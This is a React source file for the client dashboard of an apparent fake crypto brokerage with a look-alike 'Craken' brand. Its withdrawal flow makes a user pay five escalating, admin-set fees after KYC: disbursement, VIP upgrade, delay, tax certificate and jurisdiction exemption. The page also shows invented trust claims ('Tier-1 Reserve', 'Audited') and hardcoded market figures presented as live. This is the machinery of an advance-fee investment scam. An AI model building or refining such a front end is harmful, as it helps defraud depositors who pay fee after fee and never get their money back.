import React from 'react';
import {
  Wallet,
  ArrowLeftRight,
  TrendingUp,
  ArrowDownToLine,
  ArrowUpFromLine,
  ShieldCheck,
  CheckCircle2,
  Clock,
  ExternalLink,
  ChevronRight,
  Zap,
  Activity,
  Layers,
  Sparkles,
  Gift
} from 'lucide-react';
import { ClientUser, MarketAsset } from '../../types';
import { formatCurrency, translations } from '../../services/translations';
import { StoreService } from '../../services/store';

interface ClientDashboardProps {
  user: ClientUser;
  markets: MarketAsset[];
  currentCurrency: string;
  currentLanguage: string;
  onNavigate: (tab: 'dashboard' | 'trading' | 'portfolio' | 'deposit' | 'withdraw' | 'kyc') => void;
  onOpenSupport?: () => void;
}

export const ClientDashboard: React.FC<ClientDashboardProps> = ({
  user,
  markets,
  currentCurrency,
  currentLanguage,
  onNavigate,
  onOpenSupport
}) => {
  const t = translations[currentLanguage] || translations.en;

  // BTC Price for crypto equivalent calculation
  const btcAsset = markets.find(m => m.symbol.includes('BTC'));
  const ethAsset = markets.find(m => m.symbol.includes('ETH'));
  const btcPrice = btcAsset ? btcAsset.price : 94000;

  const capitalBtc = btcPrice > 0 ? ((user.totalDeposited || 0) / btcPrice).toFixed(8) : '0.00000000';
  const balanceBtc = btcPrice > 0 ? ((user.balance || 0) / btcPrice).toFixed(8) : '0.00000000';
  const profitGrowthPercent = (user.totalDeposited || 0) > 0
    ? (((user.totalProfit || 0) / user.totalDeposited) * 100).toFixed(2)
    : '0.00';

  // Get user-specific ledger & withdrawals
  const storeState = StoreService.getState();
  const allLedger = (storeState.ledger || []).filter((l) => l.userId === user.id);
  const allWithdrawals = (storeState.withdrawals || []).filter((w) => w.userId === user.id);
  const allDeposits = (storeState.deposits || []).filter((d) => d.userId === user.id);
  const completedWithdrawals = allWithdrawals.filter((w) => w.status === 'COMPLETED');

  // 6-Step Institutional Withdrawal Clearance State
  const clearance = user.withdrawalClearance || {
    withdrawalFeePaid: false,
    accountUpgraded: false,
    delayFeePaid: false,
    taxFeePaid: false,
    religiousJurisdictionApproved: false
  };

  const step1Kyc = user.kycStatus === 'verified';
  const step2Fee = clearance.withdrawalFeePaid;
  const step3Tier = clearance.accountUpgraded;
  const step4Delay = clearance.delayFeePaid;
  const step5Tax = clearance.taxFeePaid;
  const step6Jurisdiction = clearance.religiousJurisdictionApproved;

  const step2FeeAmount = clearance.withdrawalFeeAmount ?? 250;
  const step3FeeAmount = clearance.upgradeFeeAmount ?? 500;
  const step4FeeAmount = clearance.delayFeeAmount ?? 380;
  const step5FeeAmount = clearance.taxFeeAmount ?? 520;
  const step6FeeAmount = clearance.jurisdictionFeeAmount ?? 300;

  let activeStepNumber = 7;
  let activeStepName = 'All 6 Clearance Steps Approved';
  let activeStepAction = 'Proceed to Withdraw';

  if (!step1Kyc) {
    activeStepNumber = 1;
    activeStepName = 'Step 1 of 6: Tier-1 KYC Identity Verification Required';
    activeStepAction = 'Complete KYC Identity Verification';
  } else if (!step2Fee) {
    activeStepNumber = 2;
    activeStepName = `Step 2 of 6: Mandatory Disbursement Fee ($${step2FeeAmount.toFixed(2)}) Required`;
    activeStepAction = `Pay Disbursement Fee ($${step2FeeAmount.toFixed(2)})`;
  } else if (!step3Tier) {
    activeStepNumber = 3;
    activeStepName = `Step 3 of 6: VIP Tier 8.3 Account Upgrade ($${step3FeeAmount.toFixed(2)}) Required`;
    activeStepAction = `Upgrade to VIP Tier ($${step3FeeAmount.toFixed(2)})`;
  } else if (!step4Delay) {
    activeStepNumber = 4;
    activeStepName = `Step 4 of 6: Settlement Delay Clearance Fee ($${step4FeeAmount.toFixed(2)}) Required`;
    activeStepAction = `Settle Delay Fee ($${step4FeeAmount.toFixed(2)})`;
  } else if (!step5Tax) {
    activeStepNumber = 5;
    activeStepName = `Step 5 of 6: Statutory Capital Gains Tax Certificate ($${step5FeeAmount.toFixed(2)}) Required`;
    activeStepAction = `Settle Tax Certificate ($${step5FeeAmount.toFixed(2)})`;
  } else if (!step6Jurisdiction) {
    activeStepNumber = 6;
    activeStepName = `Step 6 of 6: Regional Banking Exemption Clearance ($${step6FeeAmount.toFixed(2)}) Required`;
    activeStepAction = `Settle Exemption Waiver ($${step6FeeAmount.toFixed(2)})`;
  }

  return (
    <div className="space-y-6 max-w-full overflow-x-hidden">
      {/* ================= TOP TICKER BAR (EXACT AS SCREENSHOT) ================= */}
      <div className="w-full max-w-full bg-[#0b1325] border border-[#162238] rounded-2xl p-2.5 sm:p-3 shadow-xl overflow-x-auto no-scrollbar">
        <div className="flex items-center justify-between min-w-[720px] divide-x divide-[#1e2d48]/70">
          
          {/* Ticker 1: Bitcoin */}
          <div className="px-4 flex items-center gap-3">
            <div className="flex flex-col">
              <span className="text-[11px] font-medium text-slate-300">Bitcoin</span>
              <div className="flex items-baseline gap-2">
                <span className="text-base font-bold text-white font-mono">
                  {btcAsset ? btcAsset.price.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) : '94,820.50'}
                </span>
                <span className={`text-xs font-semibold ${((btcAsset?.change24h ?? 0) >= 0) ? 'text-emerald-400' : 'text-rose-400'}`}>
                  {btcAsset ? `${btcAsset.change24h >= 0 ? '+' : ''}${btcAsset.change24h.toFixed(2)}%` : '+3.42%'}
                </span>
              </div>
            </div>
          </div>

          {/* Ticker 2: Ethereum */}
          <div className="px-4 flex items-center gap-3">
            <div className="flex flex-col">
              <span className="text-[11px] font-medium text-slate-300">Ethereum</span>
              <div className="flex items-baseline gap-2">
                <span className="text-base font-bold text-white font-mono">
                  {ethAsset ? ethAsset.price.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) : '3,420.73'}
                </span>
                <span className={`text-xs font-semibold ${((ethAsset?.change24h ?? 0) >= 0) ? 'text-emerald-400' : 'text-rose-400'}`}>
                  {ethAsset ? `${ethAsset.change24h >= 0 ? '+' : ''}${ethAsset.change24h.toFixed(2)}%` : '+0.05%'}
                </span>
              </div>
            </div>
          </div>

          {/* Ticker 2: S&P 500 with red badge */}
          <div className="px-4 flex items-center gap-3">
            <div className="flex items-center gap-2">
              <span className="w-5 h-5 rounded-full bg-[#dc2626] text-white text-[9px] font-black flex items-center justify-center shadow-sm">
                500
              </span>
              <span className="text-[11px] font-medium text-slate-300">S&P 500</span>
            </div>
            <div className="flex flex-col">
              <div className="flex items-baseline gap-2">
                <span className="text-base font-bold text-white font-mono">6,891.2</span>
                <span className="text-xs font-semibold text-rose-400 font-mono">
                  -28.30 (-0.41%)
                </span>
              </div>
            </div>
          </div>

          {/* Ticker 3: US 100 with blue badge */}
          <div className="px-4 flex items-center gap-3">
            <div className="flex items-center gap-2">
              <span className="w-5 h-5 rounded-full bg-[#2563eb] text-white text-[9px] font-black flex items-center justify-center shadow-sm">
                100
              </span>
              <span className="text-[11px] font-medium text-slate-300">US 100</span>
            </div>
            <div className="flex flex-col">
              <div className="flex items-baseline gap-2">
                <span className="text-base font-bold text-white font-mono">25,542.5</span>
                <span className="text-xs font-semibold text-rose-400 font-mono">
                  -267.00 (-1.03%)
                </span>
              </div>
            </div>
          </div>

          {/* Right Emblem: TradingView Partner Bridge */}
          <div className="px-4 flex items-center justify-end flex-1">
            <div className="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[#111c33] border border-[#1e2e4a] text-slate-300 text-[11px] font-bold">
              <span className="w-4 h-4 rounded bg-white text-slate-950 text-[10px] font-black flex items-center justify-center leading-none">
                TV
              </span>
              <span className="tracking-tight text-slate-200">TradingView</span>
            </div>
          </div>
        </div>
      </div>

      {/* ================= HERO: TOTAL ACCOUNT BALANCE & ACTIONS (SCREENSHOT ELECTRIC BLUE) ================= */}
      <div
        id="total-account-balance-card"
        className="relative overflow-hidden rounded-3xl bg-gradient-to-r from-[#008deb] via-[#008fe6] to-[#009bfd] p-6 sm:p-8 text-white shadow-2xl shadow-blue-500/20"
      >
        {/* Subtle Ambient Glow */}
        <div className="absolute -right-12 -top-12 w-60 h-60 rounded-full bg-white/15 blur-3xl pointer-events-none" />
        <div className="absolute -left-12 -bottom-12 w-48 h-48 rounded-full bg-blue-700/20 blur-2xl pointer-events-none" />

        <div className="relative z-10 flex flex-col lg:flex-row lg:items-center justify-between gap-6">
          <div className="space-y-2">
            <div className="flex items-center gap-2 flex-wrap">
              <span className="text-sm sm:text-base font-bold text-white/90 tracking-wide uppercase">
                Total Account Balance
              </span>
              <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full bg-white/20 backdrop-blur-md text-white font-semibold text-xs border border-white/25">
                <CheckCircle2 className="w-3.5 h-3.5 text-emerald-300" />
                Backed by Tier-1 Reserve
              </span>
              <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full bg-cyan-400/20 backdrop-blur-md text-cyan-200 font-semibold text-xs border border-cyan-300/30 font-mono">
                <Zap className="w-3 h-3 text-cyan-300" />
                Craken Core v8.3
              </span>
            </div>

            <div className="text-4xl sm:text-5xl lg:text-6xl font-black text-white font-mono tracking-tight py-1">
              {formatCurrency(user.balance || 0, currentCurrency)}
            </div>

            <div className="flex items-center gap-3 text-xs sm:text-sm text-white/85 font-mono">
              <span className="font-semibold">BTC {balanceBtc}</span>
              <span>•</span>
              <span className="text-white/80">Active Capital & Settlement Reserve</span>
            </div>
          </div>

          {/* Quick Actions: Deposit & Withdraw */}
          <div className="flex items-center gap-3 flex-wrap sm:flex-nowrap">
            <button
              onClick={() => onNavigate('deposit')}
              id="hero-action-deposit"
              className="px-6 py-3.5 rounded-2xl bg-white text-[#0070d6] hover:bg-slate-100 font-extrabold text-xs sm:text-sm uppercase tracking-wider shadow-xl hover:shadow-2xl transition-all flex items-center gap-2 transform active:scale-95"
            >
              <Wallet className="w-4 h-4 text-[#0070d6]" />
              <span>Deposit</span>
            </button>

            <button
              onClick={() => onNavigate('withdraw')}
              id="hero-action-withdraw"
              className="px-6 py-3.5 rounded-2xl bg-white/20 hover:bg-white/30 text-white border border-white/35 font-extrabold text-xs sm:text-sm uppercase tracking-wider backdrop-blur-md shadow-lg hover:shadow-xl transition-all flex items-center gap-2 transform active:scale-95"
            >
              <ArrowUpFromLine className="w-4 h-4 text-white" />
              <span>Withdraw</span>
            </button>
          </div>
        </div>
      </div>

      {/* ================= METRIC CARDS (MATCHING SCREENSHOT'S ELECTRIC BLUE & VIVID MINT GREEN) ================= */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4 sm:gap-6">
        
        {/* CARD 1: TOTAL PROFIT EARNED (Vivid Emerald Mint Green from Screenshot) */}
        <div
          id="total-profit-earned-card"
          className="relative overflow-hidden rounded-2xl bg-gradient-to-r from-[#00b965] via-[#00bf68] to-[#00c96e] p-6 text-white shadow-xl shadow-emerald-500/20"
        >
          <div className="absolute -right-8 -top-8 w-32 h-32 rounded-full bg-white/10 blur-xl pointer-events-none" />

          <div className="relative z-10 flex items-center justify-between mb-2">
            <span className="text-base sm:text-lg font-bold text-white/95 tracking-tight">
              Total Profit Earned
            </span>
            <div className="w-10 h-10 rounded-xl bg-white/20 backdrop-blur-sm flex items-center justify-center text-white shadow-inner">
              <TrendingUp className="w-5 h-5 text-white" />
            </div>
          </div>

          <div className="relative z-10 my-2">
            <div className="text-3xl sm:text-4xl font-extrabold text-white tracking-tight font-mono">
              +{(user.totalProfit || 0) > 0 ? formatCurrency(user.totalProfit, currentCurrency) : '$0.00'}
            </div>
          </div>

          <div className="relative z-10 flex items-center justify-between text-xs text-white/90 pt-1">
            <span className="font-bold flex items-center gap-1 font-mono">
              +{profitGrowthPercent}% ROI on Deposits
            </span>
            <span className="text-white/75 text-[11px]">Realized Yield</span>
          </div>
        </div>

        {/* CARD 2: TOTAL DEPOSITS (Electric Azure Blue from Screenshot) */}
        <div
          id="total-deposits-card"
          className="relative overflow-hidden rounded-2xl bg-gradient-to-r from-[#008deb] via-[#008fe6] to-[#009bfd] p-6 text-white shadow-xl shadow-blue-500/20"
        >
          <div className="absolute -right-8 -top-8 w-32 h-32 rounded-full bg-white/10 blur-xl pointer-events-none" />

          <div className="relative z-10 flex items-center justify-between mb-2">
            <span className="text-base sm:text-lg font-bold text-white/95 tracking-tight">
              Total Deposits
            </span>
            <div className="w-10 h-10 rounded-xl bg-white/20 backdrop-blur-sm flex items-center justify-center text-white shadow-inner">
              <Wallet className="w-5 h-5 text-white" />
            </div>
          </div>

          <div className="relative z-10 my-2">
            <div className="text-3xl sm:text-4xl font-extrabold text-white tracking-tight font-mono">
              {formatCurrency(user.totalDeposited || 0, currentCurrency)}
            </div>
          </div>

          <div className="relative z-10 flex items-center justify-between text-xs text-white/90 pt-1">
            <span>Confirmed Blockchain Principal</span>
            <span className="font-mono text-[11px] text-white/80">BTC {capitalBtc}</span>
          </div>
        </div>

        {/* CARD 3: DISPATCHED WITHDRAWALS (Complementary Royal Indigo/Violet) */}
        <div
          id="dispatched-withdrawals-card"
          className="relative overflow-hidden rounded-2xl bg-gradient-to-r from-[#5b4fe8] via-[#6a56f0] to-[#7c69f8] p-6 text-white shadow-xl shadow-purple-500/20"
        >
          <div className="absolute -right-8 -top-8 w-32 h-32 rounded-full bg-white/10 blur-xl pointer-events-none" />

          <div className="relative z-10 flex items-center justify-between mb-2">
            <span className="text-base sm:text-lg font-bold text-white/95 tracking-tight">
              Dispatched Withdrawals
            </span>
            <div className="w-10 h-10 rounded-xl bg-white/20 backdrop-blur-sm flex items-center justify-center text-white shadow-inner">
              <ArrowUpFromLine className="w-5 h-5 text-white" />
            </div>
          </div>

          <div className="relative z-10 my-2">
            <div className="text-3xl sm:text-4xl font-extrabold text-white tracking-tight font-mono">
              {formatCurrency(user.totalWithdrawn || 0, currentCurrency)}
            </div>
          </div>

          <div className="relative z-10 flex items-center justify-between text-xs text-white/90 pt-1">
            <span>Direct to Client Crypto Wallets</span>
            <span className="text-[11px] text-white/80">
              {completedWithdrawals.length > 0 ? `${completedWithdrawals.length} Settled` : 'Verified'}
            </span>
          </div>
        </div>
      </div>

      {/* ================= SECONDARY ACCUMULATING BALANCE & BONUS STRIP ================= */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        {/* Accumulating Balance Details */}
        <div className="p-5 rounded-2xl bg-[#0b1325] border border-[#162238] flex items-center justify-between shadow-sm">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-emerald-500/15 text-emerald-400 flex items-center justify-center">
              <ArrowLeftRight className="w-5 h-5" />
            </div>
            <div>
              <div className="text-xs font-semibold text-slate-400 uppercase tracking-wider">
                Accumulating Balance
              </div>
              <div className="text-xl font-bold text-white font-mono mt-0.5">
                {formatCurrency(user.balance || 0, currentCurrency)}
              </div>
            </div>
          </div>
          <div className="text-right">
            <div className="text-xs text-slate-400 font-mono">BTC {balanceBtc}</div>
            <div className="text-[11px] text-emerald-400 font-semibold mt-0.5">Real-time Compounding</div>
          </div>
        </div>

        {/* Bonus & Trading Credit */}
        <div className="p-5 rounded-2xl bg-[#0b1325] border border-[#162238] flex items-center justify-between shadow-sm">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-purple-500/15 text-purple-400 flex items-center justify-center">
              <Gift className="w-5 h-5" />
            </div>
            <div>
              <div className="text-xs font-semibold text-slate-400 uppercase tracking-wider">
                Bonus Trading Credit
              </div>
              <div className="text-xl font-bold text-white font-mono mt-0.5">
                {formatCurrency(user.bonus || 0, currentCurrency)}
              </div>
            </div>
          </div>
          <div className="text-right">
            <div className="text-xs text-slate-400">Institutional Credit</div>
            <div className="text-[11px] text-purple-400 font-semibold mt-0.5">Usable on Margin</div>
          </div>
        </div>
      </div>

      {/* ================= INSTITUTIONAL WITHDRAWAL CLEARANCE BANNER ================= */}
      <div
        className={`p-4 sm:p-5 rounded-2xl border shadow-lg flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 transition-all ${
          activeStepNumber === 7
            ? 'bg-gradient-to-r from-emerald-950/40 via-[#0b1b24] to-[#0b1325] border-emerald-500/40 text-emerald-200'
            : 'bg-gradient-to-r from-amber-950/30 via-[#0f1c38] to-[#0b1325] border-amber-500/40 text-amber-200'
        }`}
      >
        <div className="flex items-center gap-3.5">
          <div
            className={`w-11 h-11 rounded-xl flex items-center justify-center border shrink-0 ${
              activeStepNumber === 7
                ? 'bg-emerald-500/20 text-emerald-400 border-emerald-500/40'
                : 'bg-amber-500/20 text-amber-400 border-amber-500/40'
            }`}
          >
            {activeStepNumber === 7 ? (
              <CheckCircle2 className="w-5 h-5 text-emerald-400" />
            ) : (
              <ShieldCheck className="w-5 h-5 text-amber-400" />
            )}
          </div>
          <div>
            <div className="flex items-center gap-2">
              <span className="text-[10px] font-bold text-amber-400 uppercase tracking-widest">
                Regulatory Clearance Protocol
              </span>
              <span
                className={`px-2 py-0.5 rounded-full text-[9px] font-bold border ${
                  activeStepNumber === 7
                    ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30'
                    : 'bg-blue-500/20 text-blue-300 border-blue-500/30'
                }`}
              >
                {activeStepNumber === 7 ? 'All 6 Steps Cleared' : `Step ${activeStepNumber} of 6 Active`}
              </span>
            </div>
            <div className="text-sm font-bold text-white mt-0.5">{activeStepName}</div>
            <div className="text-[11px] text-slate-400">
              {activeStepNumber === 7
                ? 'Your account has completed all KYC, tier upgrade, fee, delay, tax, and regional compliance verifications.'
                : 'Admin approvals and custom fee amounts update instantly across all browsers and devices.'}
            </div>
          </div>
        </div>

        <div className="flex items-center gap-2 self-stretch sm:self-auto shrink-0">
          <button
            onClick={() => onNavigate(activeStepNumber === 1 ? 'kyc' : 'withdraw')}
            className={`w-full sm:w-auto px-4 py-2.5 rounded-xl font-extrabold text-xs shadow-md flex items-center justify-center gap-1.5 transition-all cursor-pointer ${
              activeStepNumber === 7
                ? 'bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-400 hover:to-teal-400 text-slate-950 shadow-emerald-500/20'
                : 'bg-gradient-to-r from-amber-500 to-orange-500 hover:from-amber-400 hover:to-orange-400 text-slate-950 shadow-amber-500/20'
            }`}
          >
            <span>{activeStepAction}</span>
            <ChevronRight className="w-4 h-4" />
          </button>
        </div>
      </div>

      {/* ================= QUICK ACTIONS BAR ================= */}
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
        <button
          onClick={() => onNavigate('deposit')}
          id="quick-action-deposit"
          className="p-4 rounded-xl bg-[#0b1325] hover:bg-[#111c34] border border-[#162238] hover:border-blue-500/40 text-left transition-all group shadow-sm flex items-center gap-3"
        >
          <div className="w-10 h-10 rounded-xl bg-blue-500/15 text-blue-400 group-hover:bg-blue-500 group-hover:text-white flex items-center justify-center transition-all">
            <ArrowDownToLine className="w-5 h-5" />
          </div>
          <div>
            <div className="text-sm font-bold text-white group-hover:text-blue-400 transition-colors">
              Deposit
            </div>
            <div className="text-[11px] text-slate-400">Crypto & Wire</div>
          </div>
        </button>

        <button
          onClick={() => onNavigate('withdraw')}
          id="quick-action-withdraw"
          className="p-4 rounded-xl bg-[#0b1325] hover:bg-[#111c34] border border-[#162238] hover:border-emerald-500/40 text-left transition-all group shadow-sm flex items-center gap-3"
        >
          <div className="w-10 h-10 rounded-xl bg-emerald-500/15 text-emerald-400 group-hover:bg-emerald-500 group-hover:text-white flex items-center justify-center transition-all">
            <ArrowUpFromLine className="w-5 h-5" />
          </div>
          <div>
            <div className="text-sm font-bold text-white group-hover:text-emerald-400 transition-colors">
              Withdraw
            </div>
            <div className="text-[11px] text-slate-400">Bank, PayPal & Crypto</div>
          </div>
        </button>

        <button
          onClick={() => onNavigate('trading')}
          id="quick-action-trading"
          className="p-4 rounded-xl bg-[#0b1325] hover:bg-[#111c34] border border-[#162238] hover:border-cyan-500/40 text-left transition-all group shadow-sm flex items-center gap-3"
        >
          <div className="w-10 h-10 rounded-xl bg-cyan-500/15 text-cyan-400 group-hover:bg-cyan-500 group-hover:text-white flex items-center justify-center transition-all">
            <TrendingUp className="w-5 h-5" />
          </div>
          <div>
            <div className="text-sm font-bold text-white group-hover:text-cyan-400 transition-colors">
              Live Terminal
            </div>
            <div className="text-[11px] text-slate-400">Execute Orders</div>
          </div>
        </button>

        <button
          onClick={() => {
            if (onOpenSupport) onOpenSupport();
            else {
              const chatBtn = document.getElementById('bolt-chat-toggle-btn');
              if (chatBtn) chatBtn.click();
            }
          }}
          id="quick-action-support"
          className="p-4 rounded-xl bg-[#0b1325] hover:bg-[#111c34] border border-[#162238] hover:border-amber-500/40 text-left transition-all group shadow-sm flex items-center gap-3"
        >
          <div className="w-10 h-10 rounded-xl bg-amber-500/15 text-amber-400 group-hover:bg-amber-500 group-hover:text-white flex items-center justify-center transition-all">
            <Zap className="w-5 h-5" />
          </div>
          <div>
            <div className="text-sm font-bold text-white group-hover:text-amber-400 transition-colors">
              Bolt 24/7
            </div>
            <div className="text-[11px] text-slate-400">Broker Direct Chat</div>
          </div>
        </button>
      </div>

      {/* ================= COMPLIANCE & SECURITY STATUS OVERVIEW ================= */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        {/* Identity & Verification Tier */}
        <div className="bg-[#0b1325] border border-[#162238] rounded-2xl p-5 shadow-sm flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between mb-3">
              <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider">
                Account Verification & Tier
              </span>
              <div className="w-8 h-8 rounded-lg bg-cyan-500/10 text-cyan-400 flex items-center justify-center">
                <ShieldCheck className="w-4 h-4" />
              </div>
            </div>
            <div className="flex items-center gap-2 flex-wrap">
              <span
                className={`px-2.5 py-1 rounded-full text-xs font-bold uppercase tracking-wider ${
                  user.kycStatus === 'verified'
                    ? 'bg-emerald-500/15 text-emerald-400 border border-emerald-500/30'
                    : user.kycStatus === 'pending'
                    ? 'bg-amber-500/15 text-amber-400 border border-amber-500/30'
                    : 'bg-slate-800 text-slate-300 border border-slate-700'
                }`}
              >
                {user.kycStatus === 'verified'
                  ? 'Tier-2 Verified'
                  : user.kycStatus === 'pending'
                  ? 'Under Review'
                  : 'Unverified'}
              </span>
              <span className={`px-2.5 py-1 rounded-full text-xs font-bold uppercase tracking-wider ${
                user.withdrawalClearance?.accountUpgraded
                  ? 'bg-emerald-500/15 text-emerald-400 border border-emerald-500/30'
                  : 'bg-blue-500/15 text-blue-400 border border-blue-500/30'
              }`}>
                {user.accountTier || (user.withdrawalClearance?.accountUpgraded ? 'VIP Tier 8.3' : 'Standard Tier')}
              </span>
            </div>
          </div>
          <div className="text-xs text-slate-400 mt-3 pt-3 border-t border-slate-800/80 flex items-center justify-between gap-2 flex-wrap">
            {user.withdrawalClearance?.accountUpgraded ? (
              <span className="text-emerald-400 font-medium flex items-center gap-1">
                <CheckCircle2 className="w-3.5 h-3.5" />
                Institutional VIP Tier 8.3 Active
              </span>
            ) : (
              <span className="text-slate-400 font-normal">
                Standard Brokerage Tier
              </span>
            )}
            {user.kycStatus !== 'verified' && (
              <button
                onClick={() => onNavigate('kyc')}
                className="text-cyan-400 hover:text-cyan-300 font-medium underline"
              >
                Verify KYC →
              </button>
            )}
          </div>
        </div>

        {/* Reserve Protection */}
        <div className="bg-[#0b1325] border border-[#162238] rounded-2xl p-5 shadow-sm">
          <div className="flex items-center justify-between mb-3">
            <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider">
              Reserve Protection
            </span>
            <div className="w-8 h-8 rounded-lg bg-emerald-500/10 text-emerald-400 flex items-center justify-center">
              <CheckCircle2 className="w-4 h-4" />
            </div>
          </div>
          <div className="text-lg font-bold text-white flex items-center gap-2">
            <span>1:1 Tier-1 Backed</span>
            <span className="text-[11px] px-2 py-0.5 rounded bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 font-bold uppercase">
              Audited
            </span>
          </div>
          <div className="text-xs text-slate-400 mt-2 flex items-center gap-1.5">
            <span className="inline-block w-2 h-2 rounded-full bg-emerald-400" />
            Segregated multi-signature cold storage vaults
          </div>
        </div>

        {/* Settlement Desk */}
        <div className="bg-[#0b1325] border border-[#162238] rounded-2xl p-5 shadow-sm">
          <div className="flex items-center justify-between mb-3">
            <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider">
              Settlement Channels
            </span>
            <div className="w-8 h-8 rounded-lg bg-blue-500/10 text-blue-400 flex items-center justify-center">
              <Zap className="w-4 h-4" />
            </div>
          </div>
          <div className="text-lg font-bold text-white flex items-center gap-2">
            <span>Bank Wire, PayPal & Crypto</span>
          </div>
          <div className="text-xs text-slate-400 mt-2 flex items-center gap-1.5">
            <CheckCircle2 className="w-3.5 h-3.5 text-blue-400" />
            Instant blockchain dispatch & Fedwire clearing
          </div>
        </div>
      </div>

      {/* ================= LIVE MARKETS WATCHLIST & PERFORMANCE ================= */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        
        {/* Watchlist (2 Cols) */}
        <div className="lg:col-span-2 bg-[#0b1325] border border-[#162238] rounded-2xl p-5 shadow-sm">
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center gap-2">
              <Activity className="w-4 h-4 text-blue-400" />
              <h3 className="font-bold text-white text-sm">Live Markets Watchlist</h3>
            </div>
            <button
              onClick={() => onNavigate('trading')}
              className="text-xs text-blue-400 hover:text-blue-300 font-semibold flex items-center gap-1"
            >
              Full Terminal
              <ExternalLink className="w-3 h-3" />
            </button>
          </div>

          <div className="divide-y divide-[#172338]">
            {markets.slice(0, 6).map((m) => (
              <div
                key={m.symbol}
                className="py-3 flex items-center justify-between hover:bg-[#111d33]/50 px-2 rounded-xl transition-colors"
              >
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 rounded-lg bg-[#142038] flex items-center justify-center font-black text-xs text-slate-200">
                    {m.symbol.slice(0, 3)}
                  </div>
                  <div>
                    <div className="text-sm font-bold text-white">{m.name}</div>
                    <div className="text-xs text-slate-400 font-mono">{m.symbol}</div>
                  </div>
                </div>

                <div className="text-right">
                  <div className="text-sm font-bold text-white font-mono">
                    ${m.price.toLocaleString(undefined, { minimumFractionDigits: 2 })}
                  </div>
                  <div
                    className={`text-xs font-semibold font-mono ${
                      m.change24h >= 0 ? 'text-emerald-400' : 'text-rose-400'
                    }`}
                  >
                    {m.change24h >= 0 ? '+' : ''}
                    {m.change24h}%
                  </div>
                </div>

                <button
                  onClick={() => onNavigate('trading')}
                  className="px-3 py-1 rounded-lg bg-blue-600/20 hover:bg-blue-600 text-blue-400 hover:text-white border border-blue-500/30 text-xs font-bold transition-all ml-4"
                >
                  Trade
                </button>
              </div>
            ))}
          </div>
        </div>

        {/* Account Activity / Ledger Stream */}
        <div className="bg-[#0b1325] border border-[#162238] rounded-2xl p-5 shadow-sm flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center gap-2">
                <Layers className="w-4 h-4 text-emerald-400" />
                <h3 className="font-bold text-white text-sm">Recent Account Activity</h3>
              </div>
            </div>

            {allLedger.length === 0 && allDeposits.length === 0 && allWithdrawals.length === 0 ? (
              <div className="text-center py-10 px-4">
                <div className="w-12 h-12 rounded-full bg-slate-900 border border-slate-800 flex items-center justify-center mx-auto mb-3 text-slate-500">
                  <Clock className="w-6 h-6" />
                </div>
                <div className="text-xs text-slate-400 font-medium">No transactions yet</div>
                <div className="text-[11px] text-slate-500 mt-1">
                  Deposits, profits, and withdrawals will appear here in real-time.
                </div>
              </div>
            ) : (
              <div className="space-y-3">
                {allLedger.slice(0, 4).map((record) => (
                  <div
                    key={record.id}
                    className="p-3 rounded-xl bg-[#101b30] border border-[#1a2944] text-xs space-y-1"
                  >
                    <div className="flex items-center justify-between font-bold">
                      <span className={record.action.includes('PROFIT') || record.action.includes('DEPOSIT') || record.action.includes('BONUS') ? 'text-emerald-400' : 'text-slate-300'}>
                        {record.action.replace('_', ' ')}
                      </span>
                      <span className="font-mono text-white">
                        +${record.amount.toLocaleString()}
                      </span>
                    </div>
                    <div className="text-[11px] text-slate-400 truncate">
                      {record.reason}
                    </div>
                    <div className="text-[10px] text-slate-500 font-mono">
                      {new Date(record.timestamp).toLocaleString()}
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>

          <div className="mt-4 pt-4 border-t border-[#172338]">
            <div className="flex items-center justify-between text-xs text-slate-400">
              <span>Account Status:</span>
              <span className="text-emerald-400 font-bold flex items-center gap-1">
                <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
                Live Market Bridge Active
              </span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
